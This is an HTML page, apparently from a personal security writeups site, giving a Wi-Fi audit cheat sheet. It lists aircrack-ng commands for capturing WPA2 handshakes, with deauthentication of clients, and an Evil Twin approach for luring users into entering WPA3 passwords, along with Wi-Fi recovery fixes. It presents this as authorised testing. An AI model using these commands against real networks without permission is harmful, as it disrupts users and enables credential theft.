@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tech Support | Wi-Fi Audit Cheat Sheet</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-color: #0a0a0a;
+            --card-bg: #111111;
+            --accent-blue: #00e5ff; /* Cyber Blue */
+            --text-main: #e0e0e0;
+            --text-dim: #999;
+            --border-color: #222;
+            --mono-font: 'JetBrains Mono', monospace;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            font-family: 'Inter', sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+        }
+
+        .container {
+            max-width: 900px;
+            width: 90%;
+            padding: 4rem 0;
+        }
+
+        /* Back link */
+        .back-link {
+            display: inline-block;
+            margin-bottom: 2rem;
+            color: var(--accent-blue);
+            text-decoration: none;
+            font-family: var(--mono-font);
+            font-size: 0.9rem;
+        }
+        
+        .back-link:hover {
+            text-decoration: underline;
+        }
+
+        /* Hero Section */
+        header {
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 2rem;
+            margin-bottom: 3rem;
+        }
+
+        .category {
+            font-family: var(--mono-font);
+            color: var(--accent-blue);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            font-size: 0.8rem;
+            margin-bottom: 1rem;
+            display: block;
+        }
+
+        h1 {
+            font-size: 3rem;
+            font-weight: 700;
+            margin: 0;
+            letter-spacing: -1px;
+            background: linear-gradient(to right, #fff, #666);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        /* Section Layout */
+        section {
+            margin-bottom: 4rem;
+        }
+
+        .section-num {
+            font-family: var(--mono-font);
+            color: var(--text-dim);
+            font-size: 0.9rem;
+            margin-bottom: 0.5rem;
+        }
+
+        h2 {
+            font-size: 1.5rem;
+            border-left: 3px solid var(--accent-blue);
+            padding-left: 1rem;
+            margin-bottom: 1.5rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        p {
+            color: var(--text-dim);
+            font-size: 1.05rem;
+        }
+
+        strong {
+            color: #fff;
+        }
+
+        /* Blocks & Code */
+        code {
+            font-family: var(--mono-font);
+            color: var(--accent-blue);
+            background: rgba(0, 229, 255, 0.1);
+            padding: 0.2rem 0.4rem;
+            border-radius: 4px;
+        }
+
+        pre {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            padding: 1.5rem;
+            border-radius: 8px;
+            font-family: var(--mono-font);
+            overflow-x: auto;
+            color: var(--accent-blue);
+            white-space: pre-wrap;
+        }
+
+        /* Table Design */
+        .table-container {
+            overflow-x: auto;
+            margin: 2rem 0;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-family: var(--mono-font);
+            font-size: 0.9rem;
+        }
+
+        th {
+            text-align: left;
+            padding: 1rem;
+            border-bottom: 2px solid var(--border-color);
+            color: #fff;
+            text-transform: uppercase;
+        }
+
+        td {
+            padding: 1rem;
+            border-bottom: 1px solid var(--border-color);
+            color: var(--text-dim);
+        }
+
+        tr:hover td {
+            color: var(--accent-blue);
+            background: rgba(255, 255, 255, 0.02);
+        }
+
+        /* Flag Box */
+        .flag-box {
+            background: linear-gradient(45deg, #001a1a, #000);
+            border: 1px solid var(--accent-blue);
+            padding: 2rem;
+            text-align: center;
+            border-radius: 4px;
+            margin-top: 2rem;
+        }
+
+        .flag-label {
+            display: block;
+            font-family: var(--mono-font);
+            font-size: 0.7rem;
+            color: var(--accent-blue);
+            margin-bottom: 0.5rem;
+        }
+
+        .flag-text {
+            font-family: var(--mono-font);
+            font-size: 1.5rem;
+            color: #fff;
+            text-shadow: 0 0 10px rgba(0, 229, 255, 0.5);
+        }
+
+        /* Footer Decor */
+        footer {
+            margin-top: 5rem;
+            padding-top: 2rem;
+            border-top: 1px solid var(--border-color);
+            font-family: var(--mono-font);
+            font-size: 0.8rem;
+            color: var(--text-dim);
+            text-align: right;
+        }
+
+        /* Tip Box */
+        .tip-box {
+            background: var(--card-bg);
+            border: 1px solid var(--accent-blue);
+            padding: 1.5rem;
+            border-radius: 8px;
+            margin: 2rem 0;
+        }
+        
+        .tip-box strong {
+            color: var(--accent-blue);
+        }
+
+        /* Flex layout */
+        .flex-row {
+            display: flex;
+            gap: 2rem;
+            margin-top: 1rem;
+            flex-wrap: wrap;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <a href="writeups.html" class="back-link">← Back to Writeups</a>
+    
+    <header>
+        <span class="category">Wi-Fi Security // Tech Support Playbook</span>
+        <h1>Tech Support Master Cheat Sheet</h1>
+    </header>
+
+    <section>
+        <div class="section-num">/ 00</div>
+        <h2>Overview</h2>
+        <p>This is your <strong>Master Cheat Sheet</strong>. As a Tech Support professional, having this "Playbook" ready will make you look like a wizard when a student's machine hangs or when you need to perform an audit yourself.</p>
+    </section>
+
+    <section>
+        <div class="section-num">/ 01</div>
+        <h2>Phase 1: The "Attack" Sequence (WPA2 Audit)</h2>
+        <p>This is the standard order of operations for capturing a handshake.</p>
+        
+        <div class="table-container">
+            <table>
+                <thead>
+                    <tr>
+                        <th>Step</th>
+                        <th>Command</th>
+                        <th>What it does</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>1. Identify</strong></td>
+                        <td><code>iwconfig</code></td>
+                        <td>Identifies your interface name (e.g., <code>wlan0</code>).</td>
+                    </tr>
+                    <tr>
+                        <td><strong>2. Prep</strong></td>
+                        <td><code>sudo airmon-ng check kill</code></td>
+                        <td>Kills background tasks that interfere with monitor mode.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>3. Start</strong></td>
+                        <td><code>sudo airmon-ng start wlan0</code></td>
+                        <td>Puts the card in Monitor Mode (creates <code>wlan0mon</code>).</td>
+                    </tr>
+                    <tr>
+                        <td><strong>4. Scan</strong></td>
+                        <td><code>sudo airodump-ng wlan0mon</code></td>
+                        <td>Shows all nearby networks and their BSSIDs.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>5. Target</strong></td>
+                        <td><code>sudo airodump-ng -c [channel] --bssid [MAC] -w [file] wlan0mon</code></td>
+                        <td>Focuses on one router and starts saving the capture.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>6. Deauth</strong></td>
+                        <td><code>sudo aireplay-ng -0 5 -a [BSSID] -c [Client_MAC] wlan0mon</code></td>
+                        <td>Kicks a user off so they reconnect, giving you the Handshake.</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="tip-box">
+            <strong>💡 Pro Tip:</strong> Always run <code>sudo airmon-ng check kill</code> before starting monitor mode. This kills NetworkManager and wpa_supplicant which can interfere with packet injection.
+        </div>
+
+        <p>Example Workflow:</p>
+        <pre>
+# 1. Identify interface
+iwconfig
+# Output: wlan0    IEEE 802.11  ESSID:off/any
+
+# 2. Kill interfering processes
+sudo airmon-ng check kill
+
+# 3. Start monitor mode
+sudo airmon-ng start wlan0
+# Creates wlan0mon
+
+# 4. Scan for targets
+sudo airodump-ng wlan0mon
+# Note target: AA:BB:CC:DD:EE:FF on channel 6
+
+# 5. Focus on target and capture
+sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
+
+# 6. In another terminal, deauth a client
+sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon</pre>
+    </section>
+
+    <section>
+        <div class="section-num">/ 02</div>
+        <h2>Phase 2: Obstacles & How to Bypass Them</h2>
+
+        <p><strong>Obstacle A: "Device or Resource Busy"</strong></p>
+        <p><strong>The Cause:</strong> You didn't run <code>check kill</code>, or a process like <code>wpa_supplicant</code> restarted itself.</p>
+        <p><strong>The Bypass:</strong></p>
+        <pre>
+# Run check kill twice to be sure
+sudo airmon-ng check kill
+sudo airmon-ng check kill
+
+# Force kill specific processes if needed
+sudo pkill -9 wpa_supplicant
+sudo pkill -9 NetworkManager
+
+# Check what's using the interface
+sudo lsof | grep wlan0</pre>
+
+        <p><strong>Obstacle B: "Fixed Channel -1" (Airodump-ng error)</strong></p>
+        <p><strong>The Cause:</strong> A conflict between the kernel and the driver.</p>
+        <p><strong>The Bypass:</strong></p>
+        <pre>
+# Stop monitor mode
+sudo airmon-ng stop wlan0mon
+
+# Manually set monitor mode
+sudo iwconfig wlan0 mode monitor
+sudo ip link set wlan0 up
+
+# Verify it worked
+iwconfig wlan0
+# Should show: Mode:Monitor
+
+# Now try airodump again
+sudo airodump-ng wlan0</pre>
+
+        <p><strong>Obstacle C: "WPA3 Target" (No handshake capture)</strong></p>
+        <p><strong>The Cause:</strong> The network is using <strong>SAE (Simultaneous Authentication of Equals)</strong>. Dictionary attacks won't work offline.</p>
+        <p><strong>The Bypass:</strong> You cannot bypass SAE with a simple dictionary attack. You must switch to a <strong>Social Engineering approach</strong> (like an Evil Twin portal) to trick the user into typing the password.</p>
+        <pre>
+# Create an Evil Twin with the same SSID
+sudo airbase-ng -e "TargetSSID" -c 6 wlan0mon
+
+# Set up a captive portal (using bettercap, hostapd, etc.)</pre>
+
+        <p><strong>Obstacle D: "Hidden SSID"</strong></p>
+        <p><strong>The Cause:</strong> The router isn't broadcasting its name (ESSID).</p>
+        <p><strong>The Bypass:</strong> Run airodump-ng on that specific BSSID. When a legitimate user connects, the name will "de-cloak" and appear in your terminal.</p>
+        <pre>
+# Focus on the specific BSSID
+sudo airodump-ng -c [channel] --bssid [MAC] wlan0mon
+
+# Wait for a client to connect - the SSID will appear</pre>
+
+        <div class="tip-box">
+            <strong>🔍 How it works:</strong> Even though the router doesn't broadcast the SSID, clients still send it in probe requests and association frames. When a client connects, airodump-ng captures that frame and reveals the hidden SSID.
+        </div>
+    </section>
+
+    <section>
+        <div class="section-num">/ 03</div>
+        <h2>Phase 3: The "Recovery" Sequence (Back to Work)</h2>
+        <p><strong>Crucial for Tech Support:</strong> Use this when a student says <strong>"My Wi-Fi is gone!"</strong></p>
+
+        <p><strong>Standard Recovery (Quick & Clean):</strong></p>
+        <pre>
+# 1. Stop Monitor Mode
+sudo airmon-ng stop wlan0mon
+
+# 2. Reset Hardware to Managed Mode
+sudo iwconfig wlan0 mode managed
+
+# 3. Unblock Radio (if blocked)
+sudo nmcli radio wifi on
+rfkill unblock wifi
+
+# 4. Restart Network Services
+sudo systemctl restart NetworkManager
+sudo systemctl restart wpa_supplicant
+
+# 5. Verify Wi-Fi is working
+nmcli dev status
+iwconfig wlan0</pre>
+
+        <p><strong>The "Nuclear" Fix (If <code>managed=false</code> error):</strong></p>
+        <pre>
+# 1. Edit NetworkManager config
+sudo nano /etc/NetworkManager/NetworkManager.conf
+
+# Find this section and change to:
+[ifupdown]
+managed=true
+
+# Save and exit (Ctrl+X, Y, Enter)
+
+# 2. Restart NetworkManager
+sudo systemctl restart NetworkManager
+
+# 3. If still broken, reload the driver
+sudo modprobe -r iwlwifi  # or ath9k, etc.
+sudo modprobe iwlwifi
+
+# 4. Last resort: reboot
+sudo reboot</pre>
+
+        <p><strong>Quick Troubleshooting Commands:</strong></p>
+        <pre>
+# Check interface status
+iwconfig
+ip link show
+nmcli dev status
+
+# Check if radio is blocked
+rfkill list
+
+# Restart everything at once
+sudo systemctl restart NetworkManager wpa_supplicant
+
+# Force interface up
+sudo ip link set wlan0 up</pre>
+    </section>
+
+    <section>
+        <div class="section-num">/ 04</div>
+        <h2>Professional Tips</h2>
+        
+        <div class="tip-box">
+            <strong>💼 1. Always Mention the "Check Kill"</strong>
+            <p>"Before enabling monitor mode, I always run <code>airmon-ng check kill</code> to ensure NetworkManager and wpa_supplicant don't interfere with packet injection. This demonstrates understanding of how system services can conflict with raw socket operations."</p>
+        </div>
+
+        <div class="tip-box">
+            <strong>📡 2. Distinguish Between BSSID and ESSID</strong>
+            <p>"The BSSID operates at Layer 2—it's the MAC address of the access point. The ESSID is the human-readable network name. When capturing a handshake, we target the BSSID specifically because MAC addresses don't change, while SSIDs can be hidden or spoofed."</p>
+        </div>
+
+        <div class="tip-box">
+            <strong>🔒 3. Mention SAE/WPA3</strong>
+            <p>"Modern networks increasingly use WPA3 with SAE (Simultaneous Authentication of Equals), which is resistant to offline dictionary attacks. In these cases, traditional handshake capture is ineffective—you'd need to pivot to social engineering methods like captive portal attacks or target legacy protocols like WPS."</p>
+        </div>
+
+        <div class="tip-box">
+            <strong>🧠 4. Talk About the OSI Model</strong>
+            <p>"Wi-Fi auditing operates primarily at Layer 2 (Data Link) and Layer 1 (Physical). Deauthentication attacks exploit management frames that aren't encrypted in 802.11 standards—this is a design limitation of the protocol itself, not a vulnerability in specific implementations."</p>
+        </div>
+
+        <div class="tip-box">
+            <strong>⚖️ 5. Frame It as "Security Testing"</strong>
+            <p>"This methodology is part of a comprehensive wireless security assessment. By attempting to capture handshakes and test network resilience, we can identify weak configurations and recommend upgrades to WPA3 or 802.11w management frame protection."</p>
+        </div>
+    </section>
+
+    <section>
+        <div class="section-num">/ 05</div>
+        <h2>Quick Reference Card</h2>
+        
+        <div class="table-container">
+            <table>
+                <thead>
+                    <tr>
+                        <th>Scenario</th>
+                        <th>Command</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr><td>Start monitor mode</td><td><code>sudo airmon-ng start wlan0</code></td></tr>
+                    <tr><td>Scan all networks</td><td><code>sudo airodump-ng wlan0mon</code></td></tr>
+                    <tr><td>Target specific AP</td><td><code>sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon</code></td></tr>
+                    <tr><td>Deauth client</td><td><code>sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon</code></td></tr>
+                    <tr><td>Fix "busy" error</td><td><code>sudo airmon-ng check kill</code></td></tr>
+                    <tr><td>Fix channel -1</td><td><code>sudo iwconfig wlan0 mode monitor</code></td></tr>
+                    <tr><td>Handle WPA3</td><td>Switch to Evil Twin attack</td></tr>
+                    <tr><td>Recover Wi-Fi</td><td><code>sudo systemctl restart NetworkManager</code></td></tr>
+                    <tr><td>Nuclear fix</td><td>Edit <code>/etc/NetworkManager/NetworkManager.conf</code> → <code>managed=true</code></td></tr>
+                </tbody>
+            </table>
+        </div>
+    </section>
+
+    <div class="flag-box">
+        <span class="flag-label">LEGAL DISCLAIMER</span>
+        <div class="flag-text">Always test on networks you own or have explicit permission to audit. Unauthorized access is illegal and unethical.</div>
+    </div>
+
+    <footer>
+        &copy; 2026 // CYB3R3LLA // WI-FI SECURITY & TECH SUPPORT
+    </footer>
+</div>
+
+</body>
+</html>
